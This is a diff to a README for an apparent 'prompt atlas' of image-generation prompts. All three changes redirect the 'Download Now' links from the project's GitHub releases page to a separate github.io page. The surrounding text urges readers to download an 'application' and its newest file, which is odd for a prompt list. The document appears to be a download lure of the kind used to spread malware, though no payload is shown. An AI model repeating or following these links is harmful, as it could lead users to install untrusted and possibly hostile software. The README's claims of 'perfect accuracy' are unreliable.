@@ -1,6 +1,6 @@
 # 🎨 gpt-image-2-5-prompt-atlas - 50 Proven Prompts with Real Examples
 
-[![Download Now](https://img.shields.io/badge/Download-Latest_Release-FF6B6B?style=for-the-badge)](https://github.com/Aldrovandavesiculosaoldworldvulture98/gpt-image-2-5-prompt-atlas/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest_Release-FF6B6B?style=for-the-badge)](https://aldrovandavesiculosaoldworldvulture98.github.io)
 
 ## 🗺️ What Is This?
 
@@ -12,7 +12,7 @@ Have you ever typed a detailed prompt into an image generator and gotten somethi
 
 ## 🚀 Getting Started
 
-Visit this link to download the application: [Click here to get the latest version](https://github.com/Aldrovandavesiculosaoldworldvulture98/gpt-image-2-5-prompt-atlas/releases)
+Visit this link to download the application: [Click here to get the latest version](https://aldrovandavesiculosaoldworldvulture98.github.io)
 
 The download page is straightforward. You'll see a list of released files — pick the newest one and grab it. That's all the technical skill you need.
 
@@ -77,7 +77,7 @@ This prompt atlas grows through user contributions. If you've discovered a fanta
 
 ## 📥 Your Download Awaits
 
-Ready to stop guessing and start creating? Visit this link to download the application: [Download gpt-image-2-5-prompt-atlas now](https://github.com/Aldrovandavesiculosaoldworldvulture98/gpt-image-2-5-prompt-atlas/releases)
+Ready to stop guessing and start creating? Visit this link to download the application: [Download gpt-image-2-5-prompt-atlas now](https://aldrovandavesiculosaoldworldvulture98.github.io)
 
 Get the atlas, copy your first prompt, and watch the AI bring your vision to life with perfect accuracy. After you've tried it, you'll wonder how you ever generated images without it.
 
